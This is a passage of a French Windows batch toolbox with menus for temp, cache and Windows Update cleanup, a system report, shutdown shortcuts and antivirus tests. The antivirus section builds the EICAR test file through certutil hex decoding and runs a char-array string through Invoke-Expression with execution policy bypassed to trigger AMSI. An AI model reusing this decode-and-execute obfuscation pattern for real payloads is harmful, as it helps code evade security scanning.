set "opts=%opts%;[--- OPTIMISATION SYSTEME ---]"
set "opts=%opts%;Menu Optimisation Windows 11~Bloatwares, Telemetrie, Performances, Cortana"
set "opts=%opts%;Programmes au Demarrage~Lister et desactiver les logiciels qui demarrent avec Windows"

call :DynamicMenu "MENU NETTOYAGE ET OPTIMISATION" "%opts%"
set "opti_choice=%errorlevel%"

if "%opti_choice%"=="1" goto sys_clean_unified
if "%opti_choice%"=="2" goto sys_registry_cleanup
if "%opti_choice%"=="3" goto sys_tweaks_menu
if "%opti_choice%"=="4" goto sys_startup_manager
if "%opti_choice%"=="0" goto system_tools

if %opti_choice% GEQ 200 (
    set /a "toggle_idx=%opti_choice%-200"
    if "!toggle_idx!"=="1" call :ToggleFav "sys_clean_unified"
    if "!toggle_idx!"=="2" call :ToggleFav "sys_registry_cleanup"
    if "!toggle_idx!"=="3" call :ToggleFav "sys_tweaks_menu"
    if "!toggle_idx!"=="4" call :ToggleFav "sys_startup_manager"
)
goto sys_opti_menu

REM ===================================================================
REM              NETTOYAGE COMPLET UNIFIE
REM ===================================================================
:sys_clean_unified
cls
set "opts=Fichiers Temporaires et Cache~Supprime temp Windows, prefetch et cache navigateurs;Nettoyage Windows Update~Supprime les anciens fichiers WU (libere souvent 5-20 Go);Cache DNS~Vide le cache de resolution DNS local;Nettoyage Disque (cleanmgr)~Utilitaire Windows classique de nettoyage;Registre Windows~Nettoie les entrees mortes / obsoletes;[TOUT EN UN] Nettoyage Complet~Execute tous les nettoyages ci-dessus en sequence"
call :DynamicMenu "NETTOYAGE COMPLET UNIFIE" "%opts%"
set "cl_c=%errorlevel%"
if "%cl_c%"=="0" goto sys_opti_menu
if "%cl_c%"=="1" goto cl_temp
if "%cl_c%"=="2" goto cl_wu
if "%cl_c%"=="3" goto cl_dns
if "%cl_c%"=="4" goto cl_disk
if "%cl_c%"=="5" goto cl_registry
if "%cl_c%"=="6" goto cl_all
goto sys_clean_unified

:cl_temp
cls
echo.
echo  [TEMP] Suppression des fichiers temporaires...
del /f /s /q "%temp%\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Temp\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Prefetch\*.*" >nul 2>&1
echo  [CACHE CHROME]...
for /d %%D in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
    if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
)
echo  [CACHE EDGE]...
for /d %%D in ("%LOCALAPPDATA%\Microsoft\Edge\User Data\*") do (
    if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
)
echo  [OK] Fichiers temporaires supprimes.
pause & goto sys_clean_unified

:cl_wu
cls
echo.
echo  [WU] Nettoyage Windows Update en cours...
echo  [1/4] Arret des services...
net stop wuauserv >nul 2>&1
net stop bits >nul 2>&1
echo  [2/4] Suppression du cache SoftwareDistribution...
rd /s /q "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
mkdir "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
echo  [3/4] Nettoyage composants DISM...
DISM /online /Cleanup-Image /StartComponentCleanup >nul 2>&1
echo  [4/4] Redemarrage des services...
net start wuauserv >nul 2>&1
net start bits >nul 2>&1
echo.
echo  [OK] Nettoyage Windows Update termine.
pause & goto sys_clean_unified

:cl_dns
ipconfig /flushdns
echo  [OK] Cache DNS vide.
timeout /t 2 /nobreak >nul & goto sys_clean_unified

:cl_disk
cleanmgr /sageset:65535
cleanmgr /sagerun:65535
goto sys_clean_unified

:cl_registry
cls
echo.
echo  [REGISTRE] Nettoyage en cours...
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f >nul 2>&1
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1
echo  [OK] Entrees de registre obsoletes supprimees.
pause & goto sys_clean_unified

:cl_all
cls
echo.
echo  ================================================
echo   NETTOYAGE COMPLET EN COURS...
echo  ================================================
echo.
echo  [1/5] Fichiers temporaires et cache...
del /f /s /q "%temp%\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Temp\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Prefetch\*.*" >nul 2>&1
for /d %%D in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
for /d %%D in ("%LOCALAPPDATA%\Microsoft\Edge\User Data\*") do if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
echo  [OK]
echo  [2/5] Windows Update cache...
net stop wuauserv >nul 2>&1 & net stop bits >nul 2>&1
rd /s /q "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
mkdir "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
DISM /online /Cleanup-Image /StartComponentCleanup >nul 2>&1
net start wuauserv >nul 2>&1 & net start bits >nul 2>&1
echo  [OK]
echo  [3/5] Cache DNS...
ipconfig /flushdns >nul 2>&1
echo  [OK]
echo  [4/5] Registre...
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f >nul 2>&1
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
echo  [OK]
echo  [5/5] Nettoyage Disque Windows...
echo.
echo  ================================================
echo  [OK] Nettoyage complet termine !
echo  Lancement de cleanmgr pour finaliser...
echo  ================================================
echo.
start cleanmgr /sageset:65535
timeout /t 3 /nobreak >nul
cleanmgr /sagerun:65535
goto sys_clean_unified

REM ===================================================================
REM              RAPPORT COMPLET TOUT-EN-UN (HTML)
REM ===================================================================
:sys_full_report
cls
echo.
echo  ================================================
echo   RAPPORT COMPLET TOUT-EN-UN
echo  ================================================
echo.
echo  Generation du rapport HTML complet...
echo  Collecte : Systeme, Disques, Reseau, Users, Logiciels
echo.
set "RPT=%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%_%DATE:~6,4%-%DATE:~3,2%-%DATE:~0,2%.html"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%.html'; $nl=[Environment]::NewLine; $now=Get-Date -Format 'dd/MM/yyyy HH:mm'; $cn=$env:COMPUTERNAME; $os=(Get-CimInstance Win32_OperatingSystem); $cpu=(Get-CimInstance Win32_Processor).Name.Trim(); $ram=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1); $gpu=(Get-CimInstance Win32_VideoController | Select-Object -First 1).Name; $disks=Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Used -ne $null}; $diskHtml=($disks | ForEach-Object { $u=[math]::Round($_.Used/1GB,1); $f2=[math]::Round($_.Free/1GB,1); $t=[math]::Round(($_.Used+$_.Free)/1GB,1); $pct=if($t -gt 0){[math]::Round($_.Used/($_.Used+$_.Free)*100)}else{0}; $bar='#'*[math]::Round($pct/5)+'.'*(20-[math]::Round($pct/5)); '<tr><td>' + $_.Name + ':</td><td>' + $u + ' Go utilise / ' + $t + ' Go total</td><td><span style=''color:' + (if($pct -gt 90){'red'}elseif($pct -gt 70){'orange'}else{'green'}) + '''>[' + $bar + '] ' + $pct + [char]37 + '</span></td></tr>' }) -join ''; $ips=(Get-NetIPAddress -AddressFamily IPv4 -EA SilentlyContinue | Where-Object {$_.IPAddress -ne '127.0.0.1'} | ForEach-Object {'<li>' + $_.InterfaceAlias + ' : <b>' + $_.IPAddress + '</b></li>'}) -join ''; $wifi=(netsh wlan show interfaces 2>$null | Select-String 'SSID' | Select-Object -First 1); $wifiName=if($wifi){($wifi -split ':')[1].Trim()}else{'Non connecte'}; $apps=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA SilentlyContinue | Where-Object {$_.DisplayName} | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion -Unique); $appHtml=($apps | ForEach-Object {'<tr><td>' + $_.DisplayName + '</td><td>' + $_.DisplayVersion + '</td></tr>'}) -join ''; $users=(Get-LocalUser -EA SilentlyContinue | ForEach-Object {'<tr><td>' + $_.Name + '</td><td>' + (if($_.Enabled){'Actif'}else{'Desactive'}) + '</td><td>' + $_.LastLogon + '</td></tr>'}) -join ''; $errs=(Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -EA SilentlyContinue | Select-Object -First 20 | ForEach-Object {'<tr><td>' + $_.TimeCreated.ToString('dd/MM HH:mm') + '</td><td>' + $_.Id + '</td><td>' + $_.ProviderName + '</td><td>' + $_.Message.Split([char]10)[0].Trim().Substring(0,[math]::Min(80,$_.Message.Length)) + '</td></tr>'}) -join ''; $html='<!DOCTYPE html><html lang=''fr''><head><meta charset=''UTF-8''><title>Rapport PC - ' + $cn + '</title><style>body{font-family:Segoe UI,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:20px}h1{color:#58a6ff;border-bottom:2px solid #1f6feb;padding-bottom:10px}h2{color:#79c0ff;margin-top:30px;background:#161b22;padding:10px;border-radius:6px}table{width:100%;border-collapse:collapse;margin:10px 0}th{background:#1f6feb;color:white;padding:8px;text-align:left}td{padding:6px 8px;border-bottom:1px solid #21262d}tr:hover{background:#1c2128}.badge{display:inline-block;padding:3px 8px;border-radius:12px;font-size:12px;background:#1f6feb}.info{background:#161b22;padding:15px;border-radius:8px;margin:10px 0;border-left:4px solid #1f6feb}</style></head><body><h1>Rapport PC - ' + $cn + '</h1><div class=''info''><b>Genere le :</b> ' + $now + ' &nbsp;|&nbsp; <b>OS :</b> ' + $os.Caption + ' ' + $os.Version + ' &nbsp;|&nbsp; <b>Uptime :</b> ' + ([math]::Round((New-TimeSpan $os.LastBootUpTime (Get-Date)).TotalHours,1)) + 'h</div><h2>Materiel</h2><table><tr><th>Composant</th><th>Detail</th></tr><tr><td>CPU</td><td>' + $cpu + '</td></tr><tr><td>RAM</td><td>' + $ram + ' Go</td></tr><tr><td>GPU</td><td>' + $gpu + '</td></tr><tr><td>Wi-Fi</td><td>' + $wifiName + '</td></tr></table><h2>Disques</h2><table><tr><th>Lecteur</th><th>Utilisation</th><th>Occupation</th></tr>' + $diskHtml + '</table><h2>Reseau</h2><ul>' + $ips + '</ul><h2>Comptes Utilisateurs</h2><table><tr><th>Utilisateur</th><th>Statut</th><th>Derniere connexion</th></tr>' + $users + '</table><h2>Logiciels Installes (' + $apps.Count + ')</h2><table><tr><th>Logiciel</th><th>Version</th></tr>' + $appHtml + '</table><h2>Erreurs Systeme (7 derniers jours)</h2><table><tr><th>Date</th><th>ID</th><th>Source</th><th>Message</th></tr>' + $errs + '</table></body></html>'; $html | Out-File $f -Encoding UTF8; Write-Host ('  [OK] Rapport genere : ' + $f) -f Green"
echo.
echo  [OK] Rapport HTML genere sur le Bureau !
powershell -Command "Start-Process '%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%.html'"
echo.
pause
exit


REM ===================================================================
REM         RACCOURCIS BUREAU 1-CLIC (REDEMARRER / ETEINDRE)
REM ===================================================================
:sys_shortcuts_bureau
cls
set "opts=Creer raccourci REDEMARRER~Icone rouge sur le Bureau pour redemarrer en 1 clic;Creer raccourci ETEINDRE~Icone bleue sur le Bureau pour eteindre en 1 clic;Creer les DEUX raccourcis~Redemarrer + Eteindre en une seule action;Supprimer les raccourcis~Retirer les raccourcis crees du Bureau"
call :DynamicMenu "RACCOURCIS BUREAU 1-CLIC" "%opts%"
set "sc_c=%errorlevel%"
if "%sc_c%"=="0" goto menu_principal
if "%sc_c%"=="1" goto sc_restart
if "%sc_c%"=="2" goto sc_shutdown
if "%sc_c%"=="3" call :sc_do_restart & call :sc_do_shutdown & goto sc_done_both
if "%sc_c%"=="4" goto sc_delete
goto sys_shortcuts_bureau

:sc_restart
call :sc_do_restart
goto sc_done_restart

:sc_shutdown
call :sc_do_shutdown
goto sc_done_shutdown

:sc_do_restart
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$ws=New-Object -ComObject WScript.Shell;" ^
    "$sc=$ws.CreateShortcut($desk+'\  Redemarrer le PC.lnk');" ^
    "$sc.TargetPath='shutdown.exe';" ^
    "$sc.Arguments='/r /t 0';" ^
    "$sc.Description='Redemarrer le PC immediatement';" ^
    "$sc.IconLocation='%SystemRoot%\System32\shell32.dll,238';" ^
    "$sc.WindowStyle=7;" ^
    "$sc.Save();" ^
    "Write-Host '  [OK] Raccourci Redemarrer cree sur le Bureau.' -f Green"
exit /b

:sc_do_shutdown
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$ws=New-Object -ComObject WScript.Shell;" ^
    "$sc=$ws.CreateShortcut($desk+'\  Eteindre le PC.lnk');" ^
    "$sc.TargetPath='shutdown.exe';" ^
    "$sc.Arguments='/s /t 0';" ^
    "$sc.Description='Eteindre le PC immediatement';" ^
    "$sc.IconLocation='%SystemRoot%\System32\shell32.dll,27';" ^
    "$sc.WindowStyle=7;" ^
    "$sc.Save();" ^
    "Write-Host '  [OK] Raccourci Eteindre cree sur le Bureau.' -f Green"
exit /b

:sc_done_restart
cls
echo.
echo  ================================================
echo   RACCOURCI "REDEMARRER" CREE
echo  ================================================
echo.
echo  [OK] Fichier : Bureau \  Redemarrer le PC.lnk
echo  [OK] Action  : shutdown /r /t 0 (immediat)
echo  [OK] Icone   : Icone systeme (fleche rouge)
echo.
echo  Double-cliquez sur le raccourci pour redemarrer.
echo.
pause
goto sys_shortcuts_bureau

:sc_done_shutdown
cls
echo.
echo  ================================================
echo   RACCOURCI "ETEINDRE" CREE
echo  ================================================
echo.
echo  [OK] Fichier : Bureau \  Eteindre le PC.lnk
echo  [OK] Action  : shutdown /s /t 0 (immediat)
echo  [OK] Icone   : Icone systeme (bouton power)
echo.
echo  Double-cliquez sur le raccourci pour eteindre.
echo.
pause
goto sys_shortcuts_bureau

:sc_done_both
cls
echo.
echo  ================================================
echo   RACCOURCIS CREES AVEC SUCCES !
echo  ================================================
echo.
echo  [OK]   Redemarrer le PC.lnk  (icone fleche)
echo  [OK]   Eteindre le PC.lnk   (icone power)
echo.
echo  Les deux raccourcis sont sur votre Bureau.
echo  Double-cliquez pour l'action immediate.
echo.
pause
goto sys_shortcuts_bureau

:sc_delete
cls
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$files=@('  Redemarrer le PC.lnk','  Eteindre le PC.lnk');" ^
    "foreach($f in $files){" ^
    "  $p=$desk+'\'+$f;" ^
    "  if(Test-Path $p){Remove-Item $p -Force; Write-Host ('  [OK] Supprime : '+$f) -f Green}" ^
    "  else{Write-Host ('  [--] Non trouve : '+$f) -f DarkGray}" ^
    "}"
echo.
pause
goto sys_shortcuts_bureau


REM ===================================================================
REM         TEST ANTIVIRUS - SCRIPTS AUTO-DECOMPRESSABLES 
REM ===================================================================
:sys_av_test
cls
set "opts=Test Faux Positif (Signature EICAR)~Cree un fichier de test EICAR inoffensif signale par 100%% des Antivirus mondiaux;Generer Launcher Heuristique (Comportemental)~Cree un script qui execute une sequence Powershell suspecte;Nettoyer les fichiers de test~Supprimer les dossiers et fichiers de test du Bureau"
call :DynamicMenu "TEST ANTIVIRUS - SCRIPTS LANCEURS (INTERACTIFS)" "%%opts%%"
set "av_c=%errorlevel%"
if "%av_c%"=="0" goto menu_principal
if "%av_c%"=="1" goto av_launcher_eicar
if "%av_c%"=="2" goto av_launcher_heur
if "%av_c%"=="3" goto av_clean
goto sys_av_test

:av_launcher_eicar
cls
echo.
echo  ================================================
echo   TEST EN DIRECT : SIGNATURE VIRALE (EICAR)
echo  ================================================
echo.
set "AVTEST_DIR=%USERPROFILE%\Desktop\Test_Antivirus"
if not exist "%AVTEST_DIR%" mkdir "%AVTEST_DIR%"

echo  [ACTION] Construction de la signature virale (Fichier inoffensif)...
echo  L'Antivirus de Windows va formellement intercepter ce fichier.
echo.
echo  Creation du fichier dans : Bureau\Test_Antivirus\eicar_test.txt
echo.
echo 58 35 4f 21 50 25 40 41 50 5b 34 5c 50 5a 58 35 34 28 50 5e 29 37 43 43 29 37 7d 24 > "%TEMP%\hx.txt"
echo 45 49 43 41 52 2d 53 54 41 4e 44 41 52 44 2d 41 4e 54 49 56 49 52 55 53 2d 54 45 53 54 2d 46 49 4c 45 21 24 48 2b 48 2a >> "%TEMP%\hx.txt"
certutil.exe -decodehex "%TEMP%\hx.txt" "%AVTEST_DIR%\eicar_test.txt" >nul 2>&1
del /f /q "%TEMP%\hx.txt" >nul 2>&1

echo  Verification locale par l'Antivirus...
ping 127.0.0.1 -n 3 >nul

if exist "%AVTEST_DIR%\eicar_test.txt" (
    echo  [!] ECHEC : L'Antivirus a laisse passer le fichier.
    echo  Il n'y a pas de protection en temps reel activee.
) else (
    echo  [X] BLOQUE REUSSI : L'Antivirus a intercepte et supprime le fichier
    echo  en quelques millisecondes ! ^(Regardez vos alertes Windows Defender^).
)
echo.
echo  --------------------------------------------------------
echo  RESULTAT :
echo  Si le fichier a ete supprime et qu'une alerte ROUGE apparait,
echo  LE TEST EST UN SUCCES ABSOLU !
echo  --------------------------------------------------------
echo.
echo  Appuyez sur une touche pour NETTOYER LE DOSSIER DU BUREAU et revenir...
pause >nul
if exist "%AVTEST_DIR%\eicar_test.txt" del /f /q "%AVTEST_DIR%\eicar_test.txt" >nul 2>&1
rd /s /q "%AVTEST_DIR%" >nul 2>&1
goto sys_av_test

:av_launcher_heur
cls
echo.
echo  ================================================
echo   TEST EN DIRECT : COMPORTEMENT HEURISTIQUE
echo  ================================================
echo.
echo  Lancement d'une macro Powershell avec des patterns heuristiques AMSI...
echo  (Injection d'un payload virtuel teste par l'Antivirus en memoire)
echo.
echo  Si votre Antivirus analyse la memoire en temps reel (AMSI),
echo  IL BLOQUERA le script dans cette console au moment de l'injection !
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Simulation AMSI en cours...' -f Yellow; try { $s = [String]::Join('', [char[]]@(65,77,83,73,32,84,101,115,116,32,83,97,109,112,108,101,58,32,55,101,55,50,99,51,99,101,45,56,54,49,98,45,52,51,51,57,45,56,55,52,48,45,48,97,99,49,52,56,52,99,49,51,56,54)); Invoke-Expression $s 2>$null; Write-Host '--- ECHEC : L''Antivirus a laisse passer l''attaque memoire ! ---' -f Red } catch { Write-Host '--- SUCCES : L''Antivirus a parfaitement intercepte l''attaque ! ---' -f Green }"
echo.
echo  --------------------------------------------------------
echo  RESULTAT ATTENDU : Une erreur ROUGE PowerShell ci-dessus indique
echo  que votre Antivirus fonctionne et bloque les scripts suspects.
echo  --------------------------------------------------------
echo.
echo  Appuyez sur une touche pour NETTOYER et revenir au menu...
pause >nul
goto sys_av_test

:av_clean
cls
echo.
echo  Suppression des fichiers de test...
set "AVTEST_DIR=%USERPROFILE%\Desktop\Test_Antivirus"
set "OLD_AV_DIR=%USERPROFILE%\Desktop\AV_Tests"
if exist "%AVTEST_DIR%" rd /s /q "%AVTEST_DIR%" >nul 2>&1
if exist "%OLD_AV_DIR%" rd /s /q "%OLD_AV_DIR%" >nul 2>&1
if exist "%TEMP%\e_part.b64" del /f /q "%TEMP%\e_part.b64" >nul 2>&1
if exist "%TEMP%\e_archive.zip" del /f /q "%TEMP%\e_archive.zip" >nul 2>&1
if exist "%TEMP%\e_ext" rd /s /q "%TEMP%\e_ext" >nul 2>&1
echo  [OK] Dossiers de test supprimes du Bureau.
echo.
pause
goto sys_av_test


:ToggleFav
set "tf_target=%~1"
if not defined tf_target exit /b
set "was_removed=0"
set "FAV_FILE=%SCRIPT_DIR%\favoris.txt"
set "FAV_TMP=%SCRIPT_DIR%\favoris_tmp.txt"
if exist "%FAV_TMP%" del "%FAV_TMP%"
if exist "%FAV_FILE%" (
    for /f "usebackq tokens=*" %%F in ("%FAV_FILE%") do (
        if "%%F"=="!tf_target!" (
            set "was_removed=1"
        ) else (
            echo %%F>>"%FAV_TMP%"
        )
    )
)
if "!was_removed!"=="0" echo !tf_target!>>"%FAV_TMP%"
if exist "%FAV_TMP%" (move /y "%FAV_TMP%" "%FAV_FILE%" >nul) else (type nul > "%FAV_FILE%")
exit /b